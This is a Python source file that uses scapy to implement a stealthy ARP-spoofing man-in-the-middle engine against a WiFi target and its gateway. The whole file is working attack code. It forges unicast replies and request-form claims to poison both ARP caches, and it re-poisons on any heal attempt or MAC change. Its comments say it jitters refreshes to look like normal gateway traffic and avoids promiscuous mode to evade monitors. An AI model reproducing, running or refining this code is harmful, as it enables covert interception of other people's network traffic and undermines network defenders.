"""Unicast-ARP positioning: take the middle without the target ever noticing.

On WiFi the AP *is* the gateway, so it answers broadcast probes with zero
relay hops while our replies need two airtime slots — we can never reliably
win that last-writer race. So nothing here depends on winning it:

  * classic unicast is-at replies, AND
  * request-form claims: an ARP *request* sent as the other party. The
    receiver updates its existing entry from the sender fields (the same
    mechanism gratuitous ARP relies on) — a unilateral update with no race,
    honored even by hardened ARP stacks.

Claims go out in small bursts on takeover, every refresh (~10s, jittered,
indistinguishable from normal gateway behavior) and instantly on any detected
heal attempt or MAC change.
"""
import random
import threading
import time

from scapy.all import ARP, AsyncSniffer, Ether, conf, sendp, srp1

conf.verb = 0


def resolve_mac(ip, iface, timeout=2.0):
    """Ask for ip's MAC the normal way (one broadcast ARP request)."""
    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
    resp = srp1(req, iface=iface, timeout=timeout, verbose=0)
    if resp is not None and ARP in resp and resp[ARP].op == 2:
        return resp[Ether].src
    return None


class PositionEngine:
    def __init__(self, iface, st, refresh_interval=10.0, refresh_jitter=3.0,
                 burst=3, burst_gap=0.035, log=None):
        self.iface = iface
        self.st = st
        self.refresh_interval = refresh_interval
        self.refresh_jitter = refresh_jitter
        self.burst = burst
        self.burst_gap = burst_gap
        self.log = log or print
        self.arps_answered = 0
        self.refreshes = 0
        self.heal_fixes = 0
        self.mac_changes = 0
        self._stop = threading.Event()
        self._sniffer = None

    # ---- claim packets ----------------------------------------------------------
    def _claim_packets(self):
        my = self.st["my_mac"]
        t_mac, t_ip = self.st["target_mac"], self.st["target_ip"]
        g_mac, g_ip = self.st["gw_mac"], self.st["gw_ip"]
        return [
            # to the phone: "<gw> is at us" + the gateway "probing" the phone
            Ether(dst=t_mac) / ARP(op=2, psrc=g_ip, hwsrc=my,
                                   pdst=t_ip, hwdst=t_mac),
            Ether(dst=t_mac) / ARP(op=1, psrc=g_ip, hwsrc=my, pdst=t_ip),
            # to the gateway: "<target> is at us" + the phone "probing" the gw
            Ether(dst=g_mac) / ARP(op=2, psrc=t_ip, hwsrc=my,
                                   pdst=g_ip, hwdst=g_mac),
            Ether(dst=g_mac) / ARP(op=1, psrc=t_ip, hwsrc=my, pdst=g_ip),
        ]

    def _send_claims(self, burst=True):
        pkts = self._claim_packets()
        rounds = self.burst if burst else 1
        for i in range(rounds):
            for p in pkts:
                sendp(p, iface=self.iface, verbose=0)
            if i < rounds - 1:
                time.sleep(self.burst_gap)

    # ---- lifecycle -----------------------------------------------------------------
    def start(self):
        # takeover: the data plane is already verified by the caller, so nothing
        # is dropped while both sides learn the new path
        self._send_claims()
        self._sniffer = AsyncSniffer(iface=self.iface, filter="arp",
                                     prn=self._on_arp, store=False,
                                     promisc=False)  # stay invisible to monitors
        self._sniffer.start()
        self._refresher = threading.Thread(target=self._refresh_loop, daemon=True)
        self._refresher.start()

    def stop(self):
        self._stop.set()
        try:
            if self._sniffer:
                self._sniffer.stop()
        except Exception:
            pass

    # ---- callbacks --------------------------------------------------------------------
    def _on_arp(self, pkt):
        try:
            arp = pkt[ARP]
            my = self.st["my_mac"]
            src_mac = pkt[Ether].src.lower()
            t_mac = self.st["target_mac"].lower()
            g_mac = self.st["gw_mac"].lower()

            # MAC rotation / replacement detection (private MACs can rotate)
            if arp.psrc == self.st["target_ip"] and src_mac not in (my, t_mac):
                self.log(f"[!] target MAC changed: {self.st['target_mac']} -> "
                         f"{pkt[Ether].src}; adopting and re-claiming")
                self.st["target_mac"] = pkt[Ether].src
                self.mac_changes += 1
                self._send_claims()
                return
            if arp.psrc == self.st["gw_ip"] and src_mac not in (my, g_mac):
                self.log(f"[!] gateway MAC changed: {self.st['gw_mac']} -> "
                         f"{pkt[Ether].src}; adopting and re-claiming")
                self.st["gw_mac"] = pkt[Ether].src
                self.mac_changes += 1
                self._send_claims()
                return

            if arp.op == 1 and src_mac in (t_mac, g_mac):
                # one of our parties is asking where the other one is — answer
                # fast, with spread copies so one of ours is the last writer
                if arp.pdst == self.st["gw_ip"]:
                    claim = Ether(dst=src_mac) / ARP(
                        op=2, psrc=self.st["gw_ip"], hwsrc=my,
                        pdst=arp.psrc, hwdst=src_mac)
                elif arp.pdst == self.st["target_ip"]:
                    claim = Ether(dst=src_mac) / ARP(
                        op=2, psrc=self.st["target_ip"], hwsrc=my,
                        pdst=arp.psrc, hwdst=src_mac)
                else:
                    return
                for delay in (0.0, 0.03, 0.08):
                    if delay:
                        time.sleep(delay)
                    sendp(claim, iface=self.iface, verbose=0)
                self.arps_answered += 1

            elif arp.op == 2:
                # our own frames loop back to the sniffer — never react to them
                if arp.hwsrc.lower() == my:
                    return
                # an owner answering OUR probe (L2 dst = us) is not a heal;
                # a real heal targets our party or the broadcast address
                if pkt[Ether].dst.lower() == my.lower():
                    return
                if (arp.psrc == self.st["gw_ip"]
                        and arp.hwsrc.lower() == g_mac):
                    self._send_claims()
                    self.heal_fixes += 1
                elif (arp.psrc == self.st["target_ip"]
                        and arp.hwsrc.lower() == t_mac):
                    self._send_claims()
                    self.heal_fixes += 1
        except Exception:
            pass

    def _refresh_loop(self):
        while not self._stop.wait(self._next_wait()):
            self._send_claims()
            self.refreshes += 1

    def _next_wait(self):
        # real gateways refresh their announcements too — keep a human-ish
        # cadence instead of a robotic fixed interval
        return max(5.0, self.refresh_interval
                   + random.uniform(-self.refresh_jitter, self.refresh_jitter))
